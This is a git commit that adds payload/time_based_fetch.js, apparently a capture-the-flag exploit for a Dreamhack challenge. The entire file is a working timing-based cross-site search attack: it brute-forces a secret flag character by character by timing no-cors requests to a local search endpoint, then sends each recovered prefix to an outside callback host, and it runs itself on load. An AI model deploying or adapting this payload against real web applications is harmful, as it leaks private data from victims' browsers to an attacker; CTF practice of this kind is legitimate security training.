fdf6f3d32b32968512423f5b7f3f280dfe9d9dd8
wornjss1002 <149930832+wornjss1002@users.noreply.github.com>
2025-11-09 18:56:25 +0900

    Create time_based_fetch.js

---
+++ payload/time_based_fetch.js
@@ -0,0 +1,23 @@
+async function exploit() {
+    const callback_url = "https://hucxxzq.request.dreamhack.games"
+    let flag = "a"
+    const wordlist = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_}"
+    while(!flag.endsWith("}")){
+        for (let word of wordlist){
+            let query = flag + word;
+            let start = performance.now();
+            await fetch(`http://127.0.0.1:12002/search?query=${query}`, {
+                mode:"no-cors"
+            })
+            let end = performance.now();
+            let dur = end-start;
+            if(dur >= 3000){
+                flag = query;
+                fetch(`${callback_url}/${flag}`);
+                break;
+            }
+        }
+        
+    }
+    
+} exploit();
